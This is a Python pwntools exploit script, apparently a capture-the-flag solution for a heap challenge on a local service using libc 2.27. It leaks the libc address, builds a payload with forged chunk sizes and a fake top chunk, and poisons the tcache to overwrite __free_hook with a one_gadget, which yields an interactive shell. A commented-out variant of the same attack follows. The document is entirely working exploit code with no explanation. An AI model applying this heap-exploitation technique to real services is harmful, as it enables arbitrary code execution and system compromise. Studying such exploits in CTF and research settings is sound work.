from pwn import *

p = remote('localhost', 7777)
libc = ELF('libc-2.27.so')

one_gadget = [0x4f2c5, 0x4f322, 0x10a38c]

def create(s):
    p.sendlineafter('> ', '1')
    p.sendlineafter('Contents: ', s)

def delete(i):
    p.sendlineafter('> ', '3')
    p.sendlineafter('Index: ', str(i))

def show(i):
    p.sendlineafter('> ', '2')
    p.sendlineafter('Index: ', str(i))
    p.recvuntil('Contents: ')
    return p.recvuntil('.')[:-2].ljust(8, b'\x00')

p.recvuntil('YOU: ')
libc.address = int(p.recvline()[:-1], 16) - libc.symbols['_IO_2_1_stdin_']
print(hex(libc.address))

payload = b'A' * 0x98 + p64(0x421)  # 1
payload += b'A' * 0x98 + p64(0xa1)  # 2
payload += b'A' * 0x98 + p64(0x1001)    # fake top      
payload += b'A' * (0x420 - 0x10 - 0xa0 * 2)
payload += b'A' * 0x8 + p64(0x21)   # For 0x420 chunk
payload += b'A' * 0x10
payload += b'A' * 0x8 + p64(0x21)   # For 0x420 chunk


create('')  # 0
create('')  # 1
create('')  # 2
delete(0)
create(payload) # 0
delete(1)
create('')  # 1

libc.address = u64(show(2)) - 0x3ebc40 - 0x60
print(hex(libc.address))

create('')  
delete(2)
delete(3)
create(p64(libc.symbols['__free_hook']))
create('')
create(p64(libc.address + one_gadget[1]))
delete(0)

p.interactive()

# payload = b'A' * 0x98
# payload += p64(0xa1)
# payload += p64(libc.symbols['__free_hook'])

# create('')
# create('')
# delete(1)
# delete(0)
# create(payload)
# create('')
# create(p64(libc.address + one_gadget[1]))
# delete(0)

# p.interactive()
